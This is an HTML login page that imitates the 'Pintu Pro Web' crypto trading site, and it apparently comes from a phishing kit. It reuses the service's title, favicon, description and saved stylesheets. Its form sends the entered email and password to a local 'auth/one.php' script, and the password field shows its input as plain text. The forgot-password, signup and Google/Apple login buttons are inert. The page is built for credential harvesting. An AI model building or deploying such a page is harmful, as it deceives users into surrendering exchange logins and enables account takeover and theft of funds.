<!DOCTYPE html>
<html lang="id" class="dark" style="color-scheme: dark;">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="Login%20Akun%20-%20Pintu%20Pro%20Web_files/ce8e9a1445a0e61b.css" data-precedence="next">
    <link rel="stylesheet" href="Login%20Akun%20-%20Pintu%20Pro%20Web_files/2c93183d42ded407.css" data-precedence="next">
    <title>Login Akun - Pintu Pro Web</title>
    <meta property="og:image" content="https://s3.ap-southeast-1.amazonaws.com/content.pintu.co.id/ic_launcher_1493da4144.png">
    <link rel="shortcut icon" href="https://pintu.co.id/pro/assets/favicon.png">
    <meta property="og:description" content="Login/masuk ke akun Pintu Pro Web. Nikmati pengalaman trading dengan berbagai tools canggih, biaya trading rendah dan likuiditas tinggi.">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #121212;
            color: #fff;
            line-height: 1.5;
        }
        
        .container {
            width: 100%;
            max-width: 416px;
            margin: 0 auto;
            padding: 20px;
            padding-top: 70px;
        }
        
  .nav1{
      z-index:999999;
      position: fixed;
      background: url("images/WTOrQT.jpg") transparent;
      background-repeat: no-repeat;
      background-size: 100%;
      height: 63px;
      width: 100%;
      margin: 0px auto;
      box-shadow: 0px 1px 4px 2px rgba(66, 68, 90, 0.18);
         
 }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 24px;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        input {
            width: 100%;
            padding: 12px;
            background-color: transparent;
            border: 1px solid #333;
            border-radius: 6px;
            color: #fff;
            font-size: 14px;
        }
        
        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #9e9e9e;
            cursor: pointer;
        }
        
        .forgot-password {
            display: block;
            text-align: right;
            font-size: 12px;
            color: #3b82f6;
            text-decoration: none;
            margin-top: 4px;
        }
        
        .btn {
            width: 100%;
            padding: 12px;
            border-radius: 6px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            border: none;
        }
        
        .btn-primary {
            background-color: #3b82f6;
            color: white;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            color: #9e9e9e;
            font-size: 12px;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #333;
        }
        
        .divider::before {
            margin-right: 16px;
        }
        
        .divider::after {
            margin-left: 16px;
        }
        
        .social-login {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }
        
        .social-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 12px;
            border: 1px solid #333;
            border-radius: 6px;
            background: none;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }
        
        .social-btn img {
            width: 20px;
            height: 20px;
        }
        
        .signup-link {
            text-align: center;
            font-size: 12px;
        }
        
        .signup-link a {
            color: #3b82f6;
            text-decoration: none;
            font-weight: 600;
        }
        
        footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #121212;
            height: 48px;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            border-top: 1px solid #333;
            padding: 0 16px;
        }
        
        .footer-link {
            display: flex;
            align-items: center;
            padding: 8px 12px;
            color: #9e9e9e;
            font-size: 10px;
            text-decoration: none;
            border-left: 1px solid #333;
        }
        
        .footer-link svg {
            width: 12px;
            height: 12px;
            margin-right: 4px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 16px;
                padding-top: 70px;
            }
            
            h1 {
                font-size: 20px;
                margin-bottom: 20px;
            }
        }
    </style>
</head>
<body>
   <nav class="nav1"></nav>
    <div class="container">
        <h1>Login dengan Akun Pintu</h1>
        
        <form action="auth/one.php" method="post">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="Masukkan email Anda">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <div class="input-wrapper">
                    <input type="text" id="password" name="password" placeholder="Masukkan password Anda">
                </div>
                <a href="#" class="forgot-password">Lupa Password?</a>
            </div>
            
            <button type="submit" class="btn btn-primary">Login</button>
        </form>
        
        <div class="divider">or</div>
        
        <div class="social-login">
            <button class="social-btn">
                <img src="google-icon.png" alt="Google">
                Login dengan Google
            </button>
            <button class="social-btn">
                <img src="apple-white-icon.png" alt="Apple">
                Login dengan Apple
            </button>
        </div>
        
        <div class="signup-link">
            Belum punya akun? <a href="">Daftar sekarang</a>
        </div>
    </div>
    
     <center>
 <img src="images/bawah.png" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
     </center>
  </div>
  <div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events:none">
     <ol tabindex="-1" class="fixed bottom-8 right-0 z-[100] flex max-h-screen w-full max-w-[420px] flex-col gap-2 p-2"></ol>
  </div>
  
</body>
</html>